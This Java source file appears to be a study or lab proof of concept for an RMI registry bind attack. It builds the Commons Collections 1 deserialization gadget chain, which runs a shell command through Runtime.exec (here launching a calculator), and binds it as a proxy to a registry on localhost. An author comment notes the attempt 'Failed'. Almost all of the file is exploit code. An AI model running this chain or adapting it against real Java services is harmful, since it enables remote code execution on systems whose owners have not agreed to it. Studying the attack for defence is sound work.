package RMIAttack.AttackRegistry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class RegistryBindAttack {
    // ??? Failed...
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry("localhost",1099);
        InvocationHandler handler = (InvocationHandler) CC1();

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),new Class[] { Remote.class }, handler));
        registry.bind("sayHello",remote);
    }

    public static Object CC1() throws Exception{
        String cmd = "/usr/bin/gnome-calculator";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // !
                new InvokerTransformer(
                        "getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap =new HashMap<>();
        hashMap.put("value","nonsense"); // ensure Map.Entry entry not empty
        Map<Object,Object> decoratedMap = (TransformedMap) TransformedMap.decorate(
                hashMap,null, chainedTransformer
        );

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Target.class,decoratedMap);
        return o;
    }
}